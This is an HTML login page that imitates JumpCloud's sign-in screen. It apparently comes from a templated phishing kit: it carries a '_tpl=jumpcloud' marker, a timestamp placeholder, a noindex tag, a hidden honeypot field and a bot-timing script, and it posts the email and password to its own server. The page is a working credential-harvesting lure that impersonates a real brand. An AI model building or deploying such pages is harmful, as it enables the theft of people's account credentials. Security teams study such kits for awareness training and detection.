<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Sign in to JumpCloud</title>
<meta name="theme-color" content="#2E5C8A">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%232E5C8A%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EJ%3C/text%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%232E5C8A%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EJ%3C/text%3E%3C/svg%3E">
<meta property="og:title" content="Sign in to JumpCloud">
<meta property="og:site_name" content="JumpCloud">
<style>
  body { margin:0;min-height:100vh;display:flex;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif;color:#1f2933; }
  .hero { flex:1 1 46%;background:#2E5C8A;color:#fff;display:flex;flex-direction:column;
          justify-content:center;padding:56px 48px;box-sizing:border-box; }
  .hero .mark { margin:0 0 26px; }
  .hero h2 { font-size:30px;line-height:1.25;margin:0 0 12px;font-weight:600; }
  .hero p { margin:0;opacity:.86;font-size:15px;line-height:1.6;max-width:34ch; }
  .side { flex:1 1 54%;display:flex;align-items:center;justify-content:center;padding:32px; }
  .form { width:100%;max-width:400px; }
  h1 { font-size:22px;font-weight:600;margin:0 0 6px; }
  .sub { font-size:14px;color:#616e7c;margin:0 0 24px; }
  .field { margin-bottom:14px; }
  .field label { display:block;font-size:13px;font-weight:500;margin:0 0 6px; }
  .field input { width:100%;padding:12px 14px;font-size:15px;border:1px solid #cbd2d9;
                 border-radius:8px;outline:none;box-sizing:border-box; }
  .field input:focus { border-color:#2E5C8A;box-shadow:0 0 0 3px rgba(0,0,0,.06); }
  .btn { width:100%;padding:13px;font-size:15px;font-weight:600;color:#fff;
         background:#2E5C8A;border:0;border-radius:8px;cursor:pointer;margin-top:8px; }
  .links { font-size:13px;margin:16px 0 0; }
  .links a { color:#2E5C8A;text-decoration:none; }
  .foot { font-size:12px;color:#7b8794;margin-top:26px;display:flex;gap:14px; }
  .foot a { color:#7b8794;text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
  @media (max-width:820px) { .hero { display:none; } .side { padding:20px; } }
</style>
</head>
<body>
<div class="hero">
  <div class="mark"><svg viewBox="0 0 167 40" width="167" height="40" role="img" aria-label="JumpCloud"><text x="0" y="30" font-family="Arial,Helvetica,sans-serif" font-size="30" font-weight="700" fill="#2E5C8A" letter-spacing="-0.5">JumpCloud</text></svg></div>
  <h2>One account for everything in JumpCloud</h2>
  <p>Sign in to reach your dashboard, files and settings - the same credentials you already use on the web.</p>
</div>
<div class="side"><div class="form">
  <h1>Sign in</h1>
  <p class="sub">Sign in with your email</p>
  <form method="POST" action="/">
    <div class="field">
      <label for="email">Email</label>
      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="username" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
    </div>
    <button class="btn" type="submit">Sign in</button>
    <div class="links"><a href="#">Can't access your account?</a></div>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="jumpcloud">
  <input type="hidden" name="_ts" value="__TS__">

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
    <div class="foot"><a href="#">Terms of use</a><a href="#">Privacy</a></div>
  </form>
</div></div>
</body>
</html>
